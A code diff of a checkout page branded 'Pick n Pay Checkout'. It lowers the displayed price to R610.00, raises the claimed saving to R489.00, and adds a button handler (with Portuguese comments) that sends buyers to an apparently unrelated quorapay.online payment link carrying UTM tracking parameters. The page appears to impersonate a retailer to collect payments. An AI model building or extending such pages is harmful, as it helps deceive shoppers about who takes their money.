@@ -24,7 +24,8 @@
     defer
   ></script>
   <!-- END UTMIFY -->
-  
+
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Delivery Details - Pick n Pay Checkout</title>
@@ -664,7 +665,7 @@ body{
     <div class="summary-totals">
       <div class="summary-row">
         <span>Subtotal (1 item)</span>
-        <span>R899.00</span>
+        <span>R610.00</span>
       </div>
 
       <div class="summary-row">
@@ -674,19 +675,33 @@ body{
 
       <div class="summary-row total">
         <span>Total</span>
-        <span>R899.00</span>
+        <span>R610.00</span>
       </div>
     </div>
 
     <div class="summary-savings">
-      You save R200.00
+      You save R489.00
     </div>
   </div>
 
 </div>
 
 <script>
-var PAYMENT_URL = 'https://app.quorapay.online/pay/72e501e0-80ee-4db6-abd9-a51eab748b32';
+completePurchase.onclick = () => {
+  const checkoutUrl = "https://app.quorapay.online/pay/72e501e0-80ee-4db6-abd9-a51eab748b32";
+
+  // Pega todos os parâmetros que estão na sua URL (os ?utm_source=...)
+  const params = window.location.search;
+
+  if (params) {
+    // Se houver parâmetros, ele junta com o link do checkout
+    // O resultando será: link.com/pay/abc?utm_source=...
+    window.location.href = checkoutUrl + params;
+  } else {
+    // Se não houver nada na URL, ele apenas segue o fluxo
+    window.location.href = checkoutUrl;
+  }
+};
 
 var form = document.getElementById('checkout-form');
 var btnSubmit = document.getElementById('btn-submit');
